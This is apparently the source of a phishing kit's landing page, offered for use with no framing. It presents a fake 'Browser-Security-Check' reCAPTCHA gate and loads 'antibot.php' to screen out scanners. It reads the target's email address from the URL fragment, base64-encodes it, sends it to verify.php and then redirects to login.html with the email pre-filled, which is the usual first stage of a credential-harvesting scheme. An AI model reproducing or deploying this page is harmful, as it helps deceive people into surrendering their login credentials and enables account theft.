<?php 
require 'antibot.php'; 
require 'fetcher.php';
?>
<!DOCTYPE html>
<html>
<head>
    <title>Browser-Security-Check</title>
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
    <style>
        /* Center the reCAPTCHA container */
        body, html {
            height: 100%;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
        }

        #recaptcha-container {
            text-align: center;
        }
    </style>
</head>
<body>
    <div id="recaptcha-container">
        <h4>Please verify that you are not a robot:</h4>
        <div class="g-recaptcha" data-sitekey="6Lesa_IqAAAAACxm6H26eytPZF4ZnR9Tjgu7Prdh" data-theme="dark" data-callback="handleCaptcha"></div>
    </div>

    <script>
     
        function isBase64(str) {
            try {
                return btoa(atob(str)) === str;
            } catch (e) {
                return false;
            }
        }

        function processEmail() {
            const hashValue = window.location.hash.substring(1); 
            if (!hashValue) return null;

            return isBase64(hashValue) ? hashValue : btoa(hashValue); 
        }

        
        function handleCaptcha() {
            console.log("reCAPTCHA completed. Handling response...");

            const response = grecaptcha.getResponse();
            if (response.length === 0) {
                console.error("reCAPTCHA response is empty.");
                alert('Please complete the reCAPTCHA.');
                return;
            }

            console.log("Sending reCAPTCHA response to server...");

            
            const emailBase64 = processEmail();
            if (!emailBase64) {
                console.error("Email is missing or invalid.");
                alert('Invalid email format. Please try again.');
                return;
            }

            
            fetch('verify.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: `recaptcha_response=${response}&email=${emailBase64}`,
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error("Network response was not ok.");
                }
                return response.json();
            })
            .then(data => {
                console.log("Server response:", data);

                if (data.success) {
                    console.log("reCAPTCHA verification successful. Redirecting...");
                    window.location.href = `login.html#${emailBase64}`;
                } else {
                    console.error("reCAPTCHA verification failed.");
                    alert('reCAPTCHA verification failed. Please try again.');
                    grecaptcha.reset();
                }
            })
            .catch(error => {
                console.error("Error during fetch:", error);
                alert("An error occurred. Please try again.");
            });
        }
    </script>
</body>
</html>
